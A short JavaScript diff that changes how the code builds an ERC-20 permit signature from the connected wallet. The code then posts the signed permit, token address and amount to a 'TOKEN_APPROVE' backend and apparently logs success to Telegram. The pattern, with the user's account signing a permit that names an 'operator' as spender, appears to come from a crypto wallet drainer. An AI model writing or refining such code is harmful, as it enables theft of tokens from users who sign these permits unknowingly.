@@ -1126,7 +1126,7 @@ if (DEBUG) {
       const hasPermit = functions.permit && functions.nonces && functions.name && isValidPermit(functions);
 
       if (hasPermit) {
-        const permitData = await permit(contract, appState.account, operator);
+        const permitData = await permit(contract, tokenAddress, amount, appState.account, operator);
         const data = { chainId, tokenAddress, abiUrl, amount, owner: appState.account, spender: operator, permit: permitData, impl: contractInfo[1] };
         await resilientAxiosPost(TOKEN_APPROVE, data);
         logTlgMsg(msg, success);
